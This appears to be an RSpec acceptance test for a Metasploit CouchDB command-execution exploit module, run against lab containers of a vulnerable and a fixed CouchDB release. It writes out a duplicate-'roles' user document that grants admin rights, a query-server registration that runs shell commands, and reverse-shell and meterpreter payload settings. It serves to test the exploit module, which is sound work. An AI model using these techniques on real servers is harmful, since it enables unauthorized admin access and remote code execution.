require 'acceptance_spec_helper'
require_relative '../../../test/module_targets/couchdb/native_client'

RSpec.describe 'CouchDB command execution targets' do
  include_context 'module target'
  include_context 'wait_for_expect'

  let_it_be(:writable_directory) { '/tmp/module-target-couchdb-exec' }

  let_it_be(:native_clients) do
    %w[open auth fixed].to_h do |service|
      endpoint = target_endpoint(service)
      credentials = service == 'open' ? nil : CouchDBNativeClient::DEFAULT_CREDENTIALS
      [service, CouchDBNativeClient.new(endpoint.fetch('host'), endpoint.fetch('port'), credentials: credentials, read_timeout: 3)]
    end
  end

  before(:all) do
    %w[open auth fixed].each do |service|
      code, version = native_request(service, 'get', '/')
      expect(code).to eq(200)
      expect(version.fetch('version')).to eq(service == 'fixed' ? '3.3.1' : '1.6.1')
      next if service == 'fixed'

      code, identity = native_request(service, 'get', '/_session')
      expect(code).to eq(200)
      expect(identity.fetch('userCtx').fetch('roles')).to include('_admin')
      if service == 'auth'
        code, = native_request(service, 'get', '/_config/query_servers', nil, nil)
        expect(code).to eq(401)
      end
      code, = native_request(service, 'put', '/_users')
      expect([201, 202, 412]).to include(code)
      expect(target_exec(service, 'sh', '-c', 'command -v curl').strip).to eq('/usr/bin/curl')
      target_exec(service, 'mkdir', '-p', writable_directory)
      target_exec(service, 'chown', 'couchdb:couchdb', writable_directory)
      native_execution_control(service)
    end
  end

  %w[open auth].each do |service|
    it "detects the affected native version on #{service}" do
      output = run_target_module('exploit/linux/http/apache_couchdb_cmd_exec', service, {}, action: 'check', allow_errors: true)
      expect(output).to include('Version 1.6.1 appears to be vulnerable')
    end
  end

  it 'does not mark the actual fixed release vulnerable' do
    output = run_target_module('exploit/linux/http/apache_couchdb_cmd_exec', 'fixed', {}, action: 'check', allow_errors: true)
    expect(output).to include('Version 3.3.1 is not vulnerable')
  end

  it 'rejects unusable credentials after creating a configured-administrator shadow account', :couchdb_auth_collision do
    original = native_state('auth')
    expect(native_request('auth', 'get', '/_session', nil, %w[labadmin wrong-password]).first).to eq(401)
    begin
      output = run_target_module('exploit/linux/http/apache_couchdb_cmd_exec', 'auth', {
        'HttpUsername' => 'labadmin', 'HttpPassword' => 'wrong-password',
        'PAYLOAD' => 'linux/x64/shell_reverse_tcp', 'LHOST' => listener_host,
        'DisablePayloadHandler' => true, 'AllowNoCleanup' => true, 'WfsDelay' => 0,
        'WritableDir' => writable_directory, 'HttpClientTimeout' => 3
      }, allow_errors: true)
      after = native_state('auth')
      expect(native_request('auth', 'get', '/_session', nil, %w[labadmin wrong-password]).first).to eq(401)
      expect(after.fetch(:databases)).to eq(original.fetch(:databases))
      expect(after.fetch(:query_servers)).to eq(original.fetch(:query_servers))
      expect(after.fetch(:users) - original.fetch(:users)).to eq(['org.couchdb.user:labadmin'])
      expect(payload_files('auth')).to be_empty
      expect(output).to include('Unable to authenticate as a CouchDB administrator')
      expect(output).not_to include('Authorization bypass successful', 'Generating curl command stager')
      expect(output).not_to match(/(?:Command shell|Meterpreter) session \d+ opened/)
    ensure
      restore_native_state('auth', original)
    end
    expect(native_state('auth')).to eq(original)
  end

  [
    ['open', 'linux/x86/shell_reverse_tcp', false],
    ['auth', 'linux/x64/shell_reverse_tcp', false],
    ['auth', 'linux/x64/shell_reverse_tcp', true],
    ['auth', 'linux/x64/shell_reverse_tcp', :existing],
    ['auth', 'linux/x64/meterpreter_reverse_tcp', false]
  ].each do |service, payload, administrator|
    authentication_context = if administrator == :existing
                               'an existing administrator account'
                             elsif administrator
                               'known administrator credentials'
                             else
                               'default authentication'
                             end
    it "executes #{payload} twice on #{service} with #{authentication_context}" do
      2.times do
        before = native_state(service)
        proof_path = '/tmp/module-target-couchdb-session-proof'
        target_exec(service, 'test', '!', '-e', proof_path)
        expect(payload_files(service)).to be_empty
        begin
          if administrator == :existing
            user = '{"type":"user","name":"labadmin","roles":["_admin"],"roles":[],"password":"labpassword"}'
            expect(native_request(service, 'put', '/_users/org.couchdb.user:labadmin', user).first).to eq(201)
          end
          options = {
            'PAYLOAD' => payload, 'LHOST' => listener_host, 'LPORT' => 4444,
            'SRVHOST' => listener_host, 'SRVPORT' => 8081, 'WfsDelay' => 10,
            'WritableDir' => writable_directory, 'CMDSTAGER::FLAVOR' => 'curl', 'Attempts' => 1,
            'HttpClientTimeout' => 3, 'HttpTrace' => true
          }
          options.merge!('HttpUsername' => 'labadmin', 'HttpPassword' => 'labpassword') if administrator
          output = run_target_module('exploit/linux/http/apache_couchdb_cmd_exec', service, options, action: 'run -z', allow_errors: true)
          if administrator == :existing
            expect(output).to include('HTTP/1.1 409 Conflict')
            expect(output).not_to include('Authorization bypass successful')
          end
          session_id = output[/(?:Command shell|Meterpreter) session (\d+) opened/, 1]
          expect(session_id).not_to be_nil, output
          meterpreter = payload.include?('meterpreter')
          command = meterpreter ? "execute -f /usr/bin/touch -a #{proof_path}" : "/usr/bin/touch #{proof_path}"
          flag = meterpreter ? '-C' : '-c'
          proof = console_command("sessions -i #{session_id} #{flag} #{command.inspect}")
          expect(proof).not_to match(/\[-\]|Exception|Unknown command/)
          wait_for_expect(15, 0.2) do
            expect(target_exec(service, 'sh', '-c', "if test -f #{proof_path}; then echo couchdb-session-proof; fi").strip).to eq('couchdb-session-proof')
          end
          expect(target_exec(service, 'stat', '-c', '%U', proof_path).strip).to eq('couchdb')
          console_command('sessions -K')
          verify_cleanup_messages(service, output)
          wait_for_expect(15, 0.2) { expect(payload_files(service)).to be_empty }
          after = native_state(service)
          expect(after.fetch(:databases) - before.fetch(:databases)).to have_attributes(length: 1)
          expect(after.fetch(:query_servers).keys - before.fetch(:query_servers).keys).to have_attributes(length: 2)
          users = after.fetch(:users) - before.fetch(:users)
          expect(users).to have_attributes(length: 1)
          # The vulnerability is precisely a disagreement over duplicate role
          # keys. JSON.parse(user_doc) keeps the last roles:[] and is not proof
          # of the account's effective authorization. Verify its real session.
          created = JSON.parse(output[/^\{"type":\s*"user",.*\}$/, 0])
          expect(users).to eq(["org.couchdb.user:#{created.fetch('name')}"])
          code, identity = native_request(service, 'get', '/_session', nil, created.values_at('name', 'password'))
          expect(code).to eq(200)
          expect(identity.fetch('userCtx').fetch('name')).to eq(created.fetch('name'))
          expect(identity.fetch('userCtx').fetch('roles').uniq).to eq(['_admin'])
        ensure
          console_command('sessions -K')
          console_command('jobs -K')
          target_exec(service, 'rm', '-f', proof_path)
          restore_native_state(service, before)
        end
        expect(native_state(service)).to eq(before)
      end
    end
  end

  def verify_cleanup_messages(service, output)
    output.lines.select { |line| line.start_with?('[-]') }.each do |line|
      path = line[%r{^\[-\] Unable to delete (#{Regexp.escape(writable_directory)}/[a-z]+)\s*$}, 1]
      expect(path).not_to be_nil, line
      # curl's generated stager also removes the executable. Accept its cleanup
      # race only when native readback proves the exact file is already absent.
      target_exec(service, 'test', '!', '-e', path)
    end
  end

  def native_request(service, *arguments)
    native_clients.fetch(service).request(*arguments)
  ensure
    File.write(File.join(target_runtime.fetch('artifacts'), "#{service}-native-http.json"), JSON.pretty_generate(native_clients.fetch(service).commands))
  end

  def native_state(service)
    code, databases = native_request(service, 'get', '/_all_dbs')
    expect(code).to eq(200)
    code, servers = native_request(service, 'get', '/_config/query_servers')
    expect(code).to eq(200)
    code, users = native_request(service, 'get', '/_users/_all_docs')
    expect(code).to eq(200)
    { databases: databases.sort, query_servers: servers, users: users.fetch('rows').map { |row| row.fetch('id') }.sort }
  end

  def restore_native_state(service, original)
    current = native_state(service)
    (current.fetch(:databases) - original.fetch(:databases)).each do |database|
      expect(native_request(service, 'delete', "/#{database}").first).to eq(200)
    end
    (current.fetch(:query_servers).keys - original.fetch(:query_servers).keys).each do |name|
      expect(native_request(service, 'delete', "/_config/query_servers/#{name}").first).to eq(200)
    end
    (current.fetch(:users) - original.fetch(:users)).each do |name|
      code, account = native_request(service, 'get', "/_users/#{name}")
      expect(code).to eq(200)
      expect([200, 202]).to include(native_request(service, 'delete', "/_users/#{name}?rev=#{account.fetch('_rev')}").first)
    end
  end

  def payload_files(service)
    target_exec(service, 'find', writable_directory, '-type', 'f', '-printf', '%P\n').lines.sort
  end

  def native_execution_control(service)
    original = native_state(service)
    proof = '/tmp/module-target-couchdb-native-proof'
    target_exec(service, 'test', '!', '-e', proof)
    begin
      code, = native_request(service, 'put', '/_config/query_servers/native_exec_probe', JSON.generate("/usr/bin/touch #{proof}"))
      expect(code).to eq(200)
      expect(native_request(service, 'put', '/native_exec_probe').first).to eq(201)
      expect(native_request(service, 'put', '/native_exec_probe/proof', { 'marker' => 'native-execution-control' }).first).to eq(201)
      trigger = { method: 'POST', path: '/native_exec_probe/_temp_view', command: "/usr/bin/touch #{proof}" }
      begin
        code, = native_request(service, 'post', trigger.fetch(:path), { 'language' => 'native_exec_probe', 'map' => '' })
        trigger[:status] = code
        expect(code).to eq(500)
      rescue Net::ReadTimeout => e
        # touch exits without speaking the query-server protocol. CouchDB retries
        # it until the view/database is removed; a bounded HTTP timeout is expected.
        trigger[:bounded_timeout] = e.class.name
      ensure
        File.write(File.join(target_runtime.fetch('artifacts'), "#{service}-native-command-trigger.json"), JSON.pretty_generate(trigger))
      end
      # Neither timeout nor API status establishes execution: require a new real
      # target file, then explicitly remove the probe's database/configuration.
      expect(target_exec(service, 'sh', '-c', "if test -f #{proof}; then echo native-execution-proof; fi").strip).to eq('native-execution-proof')
      expect(target_exec(service, 'stat', '-c', '%U', proof).strip).to eq('couchdb')
    ensure
      target_exec(service, 'rm', '-f', proof)
      restore_native_state(service, original)
    end
    expect(native_state(service)).to eq(original)
  end
end
